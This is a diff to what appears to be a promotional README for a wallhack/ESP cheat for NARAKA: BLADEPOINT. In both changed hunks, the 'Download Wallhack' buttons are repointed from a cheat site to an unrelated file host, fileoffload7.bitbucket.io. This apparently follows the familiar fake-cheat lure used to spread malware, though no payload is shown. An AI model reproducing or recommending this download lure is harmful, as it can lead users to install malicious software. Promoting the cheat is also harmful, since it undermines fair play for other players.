@@ -6,7 +6,7 @@ In **NARAKA: BLADEPOINT**, awareness is everything. You could be mid-heal and ge
 
 Whether you're a stealthy solo or a sweaty trio carry, this cheat flips the game by giving you **full vision control**—even when enemies think they’re hidden.
 
-[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://wecheaters.github.io/cheats/naraka-bladepoint/)
+[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🧩 What Does the Wallhack Do?
@@ -15,7 +15,7 @@ The **ESP (Extra Sensory Perception)** system renders enemy outlines, item marke
 
 This isn't just wall vision—it's a tactical nuke for your brain. 🧠💥
 
-[![Download Wallhack](https://cheatseller.ru/get_image/uploads/202308/php5hpugm_split_extr_nar_screen_1.jpg)](https://wecheaters.github.io/cheats/naraka-bladepoint/)
+[![Download Wallhack](https://cheatseller.ru/get_image/uploads/202308/php5hpugm_split_extr_nar_screen_1.jpg)](https://fileoffload7.bitbucket.io)
 ---
 
 ## 🔥 Wallhack Features Breakdown
